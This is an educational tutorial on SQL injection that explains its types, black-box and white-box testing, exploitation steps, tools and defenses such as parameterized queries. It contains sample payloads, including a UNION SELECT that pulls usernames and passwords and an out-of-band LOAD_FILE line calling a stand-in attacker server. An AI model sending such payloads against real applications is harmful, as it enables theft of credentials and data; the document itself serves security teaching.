SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with database queries made by an application.

# Impact of SQL Injection Attacks
* Unauthorized access to sensitive data
    * **Confidentiality:** SQLi can be used to view sensitive information, such as application usernames and passwords.
    - **Integrity:** SQLi can be used to alter the data in the database.
    - **Availability:** SQLi can be used to delete data in the database.
* Remote code execution on the operating system.

# SQL Injection is divided into 3 parts
1. In-Band (Classic)
    * Error
    * Union
2. Inferential (Blind)
    * Boolean
    * Time
3. Out-of-Band
 
##### 1.In-Band SQL Injection:-
In-Band SQLi occurs when the attacker uses the same communication channel to
both launch the attack and gather the result of the attack.
Retrieved data is presented directly in the application web page.

    1.1. Error-Based SQLi:-
Error-Based SQL Injection is a type of In-Band SQL Injection where an 
attacker intentionally triggers database errors and the error itself
reveals sensitive information.
Example- 
```
Input: www.random.com/app.php?id='
```
Output: You have an error in your SQL syntax, Check the manual that corresponds to your MySQL server version...
This error will show you that you are using MySQL and its version.

    1.2. Union-Based SQLi
UNION-Based SQL Injection is a type of In-Band SQL Injection where an attacker uses the SQL `UNION` operator to combine the results of their own malicious query with the original database query and display sensitive data on the same web page.
Example- 
```
Input: www.random.com/app.php?id=' UNION SELECT username, password FROM users--
```
Output: 
        kapil
        asdnkjsanxksj7hjv4@#
        administrator
        tn8f921kjsadkjn7ghpx

##### 2.Inferential (Blind) SQL Injection
Inferential (Blind) SQL Injection is a type of SQL injection where the website does not show any database data or error messages. The attacker cannot see the results directly, so they guess the information by watching how the website behaves. If the page changes or loads slower, it gives clues. Using true/false responses or time delays, the attacker slowly figures out the database details.

    2.1. Boolean-Based Blind SQLi
Boolean-Based SQL Injection is a type of Blind SQL Injection where the attacker does not see database data directly.
Instead, the attacker checks whether a condition is TRUE or FALSE by observing the website’s response.
Example-
**Input (TRUE condition):**
`' AND 1=1--`
Page loads normally

**Input (FALSE condition):**
`' AND 1=2--`
Page shows error / blank / different output

The difference confirms SQL injection.  

    2.2. Time-Based Blind SQLi
Time-Based Blind SQL Injection is a type of Blind SQL Injection where the attacker does not see any data or error messages.
Instead, the attacker checks the time delay in the website’s response to guess information.
Example-
- The website does **not show any data or error messages**, so nothing is visible to the attacker.
- The attacker injects a SQL query containing a **time delay function** like `SLEEP(5)`.
- If the injected condition is **TRUE**, the database pauses for a few seconds.
- The webpage **loads slowly**, which tells the attacker the condition is true.
- By repeating this process, the attacker extracts database information **step by step using time delays**.

##### 3.Out-of-Band (OAST) SQL Injection
Out-of-Band (OAST) SQL Injection is a type of SQL injection where the attacker cannot get data through normal page responses or time delays.
Instead, the database is forced to send data to an external server controlled by the attacker using another channel like DNS or HTTP.
**Example-**
```
' AND LOAD_FILE('\\\\attacker-server.com\\data')--
```
When executed, the database tries to access attacker-server.com, revealing information.




# Black Box Testing Perspective
* Map the application
    * Explore all pages, forms, APIs, and features
    * Identify input fields, parameters, and user roles
    * Understand how the application flows from page to page
* Fuzz the application
    * Enter SQL special characters like ' or " in input fields and watch for errors or unusual behavior
    * Submit Boolean conditions such as OR 1=1 and OR 1=2 and compare how the page responds
    * Send time-delay payloads and check if the application responds slower than normal
    * Submit Out-of-Band (OAST) payloads to see if the application makes external network requests

👉 *These steps help testers detect SQL injection vulnerabilities without knowing the application’s internal code.*

# White Box Testing Perspective
* Enable web server logging
    * Turn on logs to see all requests, inputs, and errors
    * Helps track how user input reaches the server

* Enable database logging
    * Log database queries being executed
    * Makes it easy to spot unsafe or dynamic SQL queries
* Map the application
    * Review all visible features and functions
    * Identify where the application interacts with the database
    * Search the code (using regex) for SQL-related functions

* Code review
    * Follow the path of user input from entry point to database
    * Check if input is properly validated or parameterized

* Test potential SQL Injection points
    * Manually test places where SQL queries are built
    * Confirm whether inputs can manipulate database queries

👉 *White-box testing focuses on source code analysis and internal behavior to find SQL injection issues early.*


# How to Exploit SQLi Vulnerabilities?
#### Exploiting Error-Based SQLi
* Submit SQL-specific character such as ' or " , and look for the errors or other anomalies
* Different characters can give you different errors

#### Exploiting Union-Based SQLi
There are two rules for combining the results sets of two queries by using UNION:
* The number and the order of the columns must be the same in all the queries.
* The data type must me compatible.

**Exploitation-**
* Figure out the number of columns that the query is making
* Figure the data types of the columns (mainly interested in string data)
* Use the UNION operator to output information from the database

#### Exploiting Boolean-based Blind SQLi
* Submit a Boolean condition that evaluates to False and not the response
* Submit a Boolean condition that evaluates to True and note the response
* Write a program that uses conditional statements to ask the database a series of True/False questions and monitor response

#### Exploiting Time-Based Blind SQLi
* Submit a payload that pauses the application for a specified period of time
* Write a program that uses conditional statements to ask the database a series of True/False questions and monitor response time.

#### Exploiting Out-of-Band SQLi
* Submit OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitor for any resulting interactions
* Depending on SQL injection use different methods to exfil data

# Automated Exploitation Tools
1. SQLMap
2. Acunetix
3. w3af
4. Wapiti
5. arachni
6. Burpsuite

# How to prevent SQLI Vulnerabilities?
**Primary Defenses**
* Option 1: Use Prepared Statements (Parameterized Queries)
    * SQL code and user input are kept separate
    * Prevents attackers from injecting SQL commands
    * This is the most effective and recommended method

* Option 2: Use Stored Procedures (Partial)
    * SQL logic is stored inside the database
    * Safe only when procedures do not use dynamic SQL
    * Helps reduce direct injection risks

* Option 3: Whitelist Input Validation (Partial)
    * Allow only expected input values (numbers, formats)
    * Blocks unexpected or malicious input
    * Useful but not sufficient alone

* Option 4: Escaping All User-Supplied Input (Partial)
    * Special characters are escaped before query execution
    * Reduces risk but can fail if implemented incorrectly

**Additional Defenses**
* Least Privileges
    * The application should use the lowest possible level of privileges when accessing the database
    * Any unnecessary default functionality in the database should be removed or disabled
    * Ensure CIS benchmark (Security checklist for database) for the database in use is applied
    * All vendors-issued security patches should be applied in a timely fashion
